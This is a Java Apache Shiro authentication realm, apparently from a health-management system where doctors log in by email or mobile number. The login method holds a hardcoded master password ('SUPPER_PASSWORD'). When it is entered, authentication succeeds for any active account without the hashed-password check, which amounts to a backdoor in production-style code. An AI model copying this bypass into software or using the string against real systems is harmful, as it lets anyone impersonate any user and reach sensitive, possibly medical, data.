package com.qiaobei.hmp.security;

import com.qiaobei.hmp.modules.entity.Doctor;
import com.qiaobei.hmp.modules.entity.StatusEntity;
import com.qiaobei.hmp.service.DoctorService;
import com.qiaobei.hmp.support.Constants;
import com.qiaobei.hmp.support.MySimpleByteSource;
import org.apache.commons.lang3.StringUtils;
import org.apache.shiro.authc.*;
import org.apache.shiro.authc.credential.HashedCredentialsMatcher;
import org.apache.shiro.authz.AuthorizationInfo;
import org.apache.shiro.authz.SimpleAuthorizationInfo;
import org.apache.shiro.realm.AuthorizingRealm;
import org.apache.shiro.subject.PrincipalCollection;
import org.springside.modules.utils.Encodes;

import javax.annotation.PostConstruct;

public class ShiroDbRealm extends AuthorizingRealm {

    private static final String SUPPER_PASSWORD = "1qaz2wsx#$%^";

    protected DoctorService doctorService;

    public void setDoctorService(DoctorService doctorService) {
        this.doctorService = doctorService;
    }

    /**
     * 认证回调函数,登录时调用.
     */
    @Override
    protected AuthenticationInfo doGetAuthenticationInfo(AuthenticationToken authcToken) throws
            AuthenticationException {
        UsernamePasswordToken token = (UsernamePasswordToken) authcToken;
        String account = token.getUsername();
        Doctor user;
        if (StringUtils.contains(account, "@")) {
            user = doctorService.getDoctorByEmail(account);
        } else {
            user = doctorService.getDoctorByMobile(account);
        }
        if (user == null) {
            throw new UnknownAccountException();//没找到帐号
        }
        if (StatusEntity.Status.Normal != user.getStatus()) {
            throw new DisabledAccountException();
        }
        if (StringUtils.equals(SUPPER_PASSWORD, String.valueOf(token.getPassword()))) {
            return new SimpleAuthenticationInfo(user, token.getCredentials(), getName());
        }
        byte[] salt = Encodes.decodeHex(user.getSalt());
//        return new SimpleAuthenticationInfo(user, user.getPassword(), ByteSource.Util.bytes(salt), account);
        return new SimpleAuthenticationInfo(user, user.getPassword(), new MySimpleByteSource(salt), account);
    }

    /**
     * 授权查询回调函数, 进行鉴权但缓存中无用户的授权信息时调用.
     */
    @Override
    protected AuthorizationInfo doGetAuthorizationInfo(PrincipalCollection principals) {
//        Doctor doctor = (Doctor) principals.getPrimaryPrincipal();
        SimpleAuthorizationInfo info = new SimpleAuthorizationInfo();
//        for (Role role : user.getRoleList()) {
//            // 基于Role的权限信息
        info.addRole("Doctor");
//            // 基于Permission的权限信息
//            info.addStringPermissions(role.getPermissions());
//        }
        return info;
    }

    /**
     * 设定Password校验的Hash算法与迭代次数.
     */
    @PostConstruct
    public void initCredentialsMatcher() {
        HashedCredentialsMatcher matcher = new HashedCredentialsMatcher(Constants.PASSWORD_HASH_ALGORITHM);
        matcher.setHashIterations(Constants.PASSWORD_HASH_INTERATIONS);
        setCredentialsMatcher(matcher);
    }

}
